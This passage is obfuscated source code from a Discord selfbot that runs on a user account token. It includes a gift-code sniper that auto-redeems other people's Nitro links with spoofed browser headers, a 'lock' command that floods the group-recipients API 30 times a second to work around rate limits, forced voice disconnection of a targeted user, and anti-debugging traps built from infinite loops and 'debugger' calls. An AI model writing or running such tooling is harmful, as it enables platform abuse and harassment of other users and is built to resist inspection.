              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(' ')
        }
        if (a4.content.includes('@everyone') || a4.content.includes('@here')) {
          if (a4.author.id === client.user.id) {
            return
          }
          if (a4.channel.type === 'dm') {
            return
          }
          console.log(' ')
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(consolecolor.atlas('[EVENT] New Ghostping:'))
          console.log(consolecolor.atlas('[EVENT] Server: ' + a4.guild.name))
          console.log(consolecolor.atlas('[EVENT] Channel: ' + a4.channel.name))
          console.log(consolecolor.atlas('[EVENT] User: ' + a4.author.tag))
          console.log(consolecolor.atlas('[EVENT] Content: ' + a4.content))
          console.log(consolecolor.atlas('[EVENT] At: ' + a4.createdAt))
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(' ')
        } else {
          return
        }
      })
      function a3(a4, a5) {
        let a6 = a4.match(
          /https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/
        )
        if (a6) {
          return a5(a6[0]), a3(a4.slice(a6.index + a6[0].length), a5)
        } else {
          a5(null)
        }
      }
      client.on('message', (a4) => {
        let a6 = []
        a3(a4.content, (a7) => {
          if (!a7) {
            return
          }
          if (!a6.includes(a7)) {
            a6.push(a7)
          }
        })
        if (a6.length == 0) {
          return
        }
        a6.forEach((a7) => {
          const a8 = { channel_id: a4.channel.id }
          fetch(
            'https://canary.discordapp.com/api/v6/entitlements/gift-codes/' +
              a7.split('/').pop() +
              '/redeem',
            {
              method: 'post',
              headers: {
                Accept: '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US',
                Authorization: client.token,
                Connection: 'keep-alive',
                'Content-Length': JSON.stringify(a8).length,
                'Content-Type': 'application/json',
                Host: 'canary.discordapp.com',
                Referer:
                  'https://canary.discordapp.com/channels/' +
                  a4.channel.id +
                  '/' +
                  a4.id,
                'User-Agent':
                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
                'X-super-properties': Buffer.from(
                  JSON.stringify({
                    os: 'Windows',
                    browser: 'Firefox',
                    device: '',
                    browser_user_agent:
                      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
                    browser_version: '66.0',
                    os_version: '10',
                    referrer: '',
                    referring_domain: '',
                    referrer_current: '',
                    referring_domain_current: '',
                    release_channel: 'canary',
                    client_build_number: 37519,
                    client_event_source: null,
                  }),
                  'utf-8'
                ).toString('base64'),
              },
              body: JSON.stringify({ channel_id: a4.channel.id }),
            }
          )
            .then((a9) => {
              if (a9.status == 400 || a9.status == 404) {
                return console.log(('code invalide :  ' + a7).red)
              }
              a9.json().then((ac) => {
                console.log(ac)
                console.log(' ')
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(
                  consolecolor.atlas(
                    '[EVENT] A nitro has probably been added to your credits'
                  )
                )
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(' ')
              })
            })
            .catch(console.error)
        })
      })
      client.on('guildDelete', (a4) => {
        console.log(' ')
        console.log(
          consolecolor.fruit(
            '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
          )
        )
        console.log(
          consolecolor.atlas('[EVENT] You have left the server ' + a4.name)
        )
        console.log(
          consolecolor.fruit(
            '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
          )
        )
        console.log(' ')
      })
      client.on('guildCreate', (a4) => {
        console.log(' ')
        console.log(
          consolecolor.fruit(
            '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
          )
        )
        console.log(
          consolecolor.atlas('[EVENT] You have joined the server ' + a4.name)
        )
        console.log(
          consolecolor.fruit(
            '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
          )
        )
        console.log(' ')
      })
      client.on('channelCreate', async (a4) => {
        if (y[client.user.id]) {
          if (!a4) {
            return
          }
        }
        if (a4.type === 'group') {
          let a7 = y[client.user.id].r
          a4.send(a7)
            .then((a8) => {
              a4.delete().catch((a9) => {})
            })
            .catch((a8) => {})
        }
      })
      client.lock = new Map()
      client.on('message', (a4) => {
        let a6, a7
        function a8() {
          if ((Date.now() - a6) / 1000 < a7) {
            return
          }
          for (let aa = 0; aa < 30; aa++) {
            const ac = { authorization: token }
            const ad = {
              method: 'PUT',
              url:
                'https://discordapp.com/api/v8/channels/' +
                a4.channel.id +
                '/recipients/1337',
              headers: ac,
            }
            const ae = ad
            axios.request(ae).catch((af) => {
              if (af.response.status === 429) {
                a7 = af.response.headers['retry-after']
                a6 = Date.now()
              }
            })
          }
        }
        if (a4.author.id != client.user.id) {
          return
        }
        if (a4.content.startsWith(prefix + 'lock')) {
          client.lock.set(a4.channel.id, setInterval(a8, 1000))
          a4.edit('\u23F2️**Group lock avec succès !**')
          console.log('Commande lock groupe executé'.yellow)
          setTimeout(function () {
            a4.delete()
          }, 2000)
        }
        if (a4.content.startsWith(prefix + 'unlock')) {
          let aa = client.lock.get(a4.channel.id)
          clearInterval(aa)
          a4.edit(
            '\u23F2️ **Group unlock, il peut mettre jusqua 120s pour être débloquer !**'
          )
          console.log('Commande unlock groupe executé'.yellow)
          setTimeout(function () {
            a4.delete()
          }, 2000)
        }
      })
      process.on('unhandledRejection', (a4) => {})
      process.on('unhandledRejection', (a4, a5) => {})
      process.on('uncaughtException', (a4, a5) => {})
      process.on('uncaughtExceptionMonitor', (a4, a5) => {})
      process.on('beforeExit', (a4) => {})
      process.on('exit', (a4) => {})
      process.on('multipleResolves', (a4, a5, a6) => {})
      client.on('error', (a4) => {})
      client.on('reconnecting', (a4) => {
        console.log('Reconnection in progress...')
      })
      client.on('resume', (a4) => {})
      client.on('disconnect', (a4) => {
        console.log('deconnected..')
      })
      client.on('voiceStateUpdate', (a4) => {
        if (B[a4.guild.id]) {
          if (!a4.guild.me.hasPermission('MUTE_MEMBERS')) {
            return
          }
          if (a4.user.id === B[a4.guild.id].user) {
            a4.setVoiceChannel(null)
          }
        }
      })
      client.login(token).catch((a4) => {
        if (a4) {
          console.log('invalid Token!\nchange it in the config.json'.red)
        }
      })
    }
  })
  .catch(
    () =>
      console.log(
        consolecolor.morning(
          '[ERREUR] Redémarre le selfbot\n[ERROR] restart the selfbot'
        )
      ) && process.exit(1)
  )
function a(b) {
  function d(g) {
    if (typeof g === 'string') {
      return function (i) {}.constructor('while (true) {}').apply('counter')
    } else {
      ;('' + g / g).length !== 1 || g % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    d(++g)
  }
  try {
    if (b) {
      return d
    } else {
      d(0)
    }
  } catch (h) {}
}
